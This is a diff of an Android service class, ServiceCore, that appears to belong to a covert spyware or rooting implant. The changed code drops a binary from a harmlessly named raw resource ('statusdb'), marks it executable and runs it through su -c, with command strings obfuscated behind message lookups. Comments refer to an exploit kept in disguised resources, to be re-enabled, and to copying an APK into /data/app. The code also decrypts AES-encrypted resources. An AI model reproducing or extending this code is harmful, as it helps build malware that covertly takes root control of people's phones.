@@ -117,16 +117,16 @@ public class ServiceCore extends Service {
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
 
-		//Core core = Core.getInstance();
-		//core.setAutostartAlarm();
-		
+		// Core core = Core.getInstance();
+		// core.setAutostartAlarm();
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
 		}
 
 		// Abbiamo su?
 		Status.self().setSu(PackageInfo.hasSu());
-		
+
 		// Abbiamo la root?
 		Status.self().setRoot(PackageInfo.checkRoot());
 
@@ -134,13 +134,13 @@ public class ServiceCore extends Service {
 			// Ask the user...
 			superapkRoot();
 
-			Status.self().setSu(PackageInfo.checkRoot());
-			
+			Status.self().setRoot(PackageInfo.checkRoot());
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onStart): isRoot = " + Status.self().haveRoot()); //$NON-NLS-1$
 			}
 		}
-		
+
 		if (Cfg.EXP) {
 			boolean isRoot = Status.self().haveRoot();
 
@@ -368,8 +368,10 @@ public class ServiceCore extends Service {
 			// .apk con tutti i permessi nel manifest
 
 			// TODO riabilitare le righe quando si reinserira' l'exploit
-			//InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
-			//fileWrite(manifest, manifestApkStream, Messages.getString("36.0"));
+			// InputStream manifestApkStream =
+			// getResources().openRawResource(R.raw.layout);
+			// fileWrite(manifest, manifestApkStream,
+			// Messages.getString("36.0"));
 
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
@@ -433,10 +435,10 @@ public class ServiceCore extends Service {
 		if (Status.self().haveSu() == false) {
 			return;
 		}
-		
+
 		Resources resources = getResources();
 		// exploit
-		//InputStream stream = resources.openRawResource(R.raw.statuslog);
+		// InputStream stream = resources.openRawResource(R.raw.statuslog);
 
 		// suidext
 		InputStream stream = resources.openRawResource(R.raw.statusdb);
@@ -449,13 +451,24 @@ public class ServiceCore extends Service {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
 				Check.log(TAG
-						+ " (superapkRoot): " + "su -c \"" + path + "/" + suidext + Messages.getString("32.11") + "\""); //$NON-NLS-1$
+						+ " (superapkRoot): " + "[su] [-c] [" + Messages.getString("32.31") + " " + Messages.getString("32.32") + "]"); //$NON-NLS-1$
 			}
 
 			Runtime.getRuntime().exec("chmod 755 " + path + "/" + suidext);
-			Process localProcess = Runtime.getRuntime().exec(new String[] {Messages.getString("32.30"), "-c", Messages.getString("32.29")}); //$NON-NLS-1$ //$NON-NLS-2$
-			
-			localProcess.waitFor();		
+
+			Process localProcess;
+			if (Cfg.OSVERSION.equals("v2")) {
+				localProcess = Runtime
+						.getRuntime()
+						.exec(new String[] {
+								Messages.getString("32.30"), "-c", Messages.getString("32.31"), Messages.getString("32.32") }); //$NON-NLS-1$ //$NON-NLS-2$
+			} else {
+				localProcess = Runtime.getRuntime().exec(
+						new String[] { Messages.getString("32.30"), "-c", Messages.getString("32.29") }); //$NON-NLS-1$ //$NON-NLS-2$
+
+			}
+
+			localProcess.waitFor();
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -608,7 +621,7 @@ public class ServiceCore extends Service {
 			Check.log(TAG + " (decodeEnc): key=" + Utils.byteArrayToHex(key.getEncoded()));
 		}
 
-		//17.4=AES/CBC/PKCS5Padding
+		// 17.4=AES/CBC/PKCS5Padding
 		Cipher cipher = Cipher.getInstance(Messages.getString("17.4")); //$NON-NLS-1$
 		final byte[] iv = new byte[16];
 		Arrays.fill(iv, (byte) 0);
